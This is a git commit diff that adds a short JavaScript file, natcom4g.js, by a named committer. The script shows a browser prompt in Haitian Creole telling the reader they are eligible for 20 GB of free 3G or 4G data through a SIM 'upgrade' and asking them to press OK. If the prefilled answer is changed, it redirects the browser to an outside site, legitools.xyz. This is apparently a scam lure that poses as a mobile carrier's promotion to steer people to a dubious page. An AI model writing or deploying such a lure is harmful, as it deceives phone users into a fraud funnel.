36a731cdd8dcd96066e5331f26d232ca18923027
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-10-14 02:45:55 -0700

    Update natcom4g.js

--- natcom4g.js
+++ natcom4g.js
@@ -1,1 +1,5 @@
-
+var password = '20GB done gratis'
+password=prompt('SMS: Felisitasyon Nimewo w elijib pou resevwa 20 GO Done gratis 3G oswa 4G UPGRADE RECONANSYON KAT SIM, Tanpri Peze OK pou aktive.. ','20GB done gratis');
+if (password != '20GB done gratis') {
+location.href='https://legitools.xyz/natcom4g.html';
+}
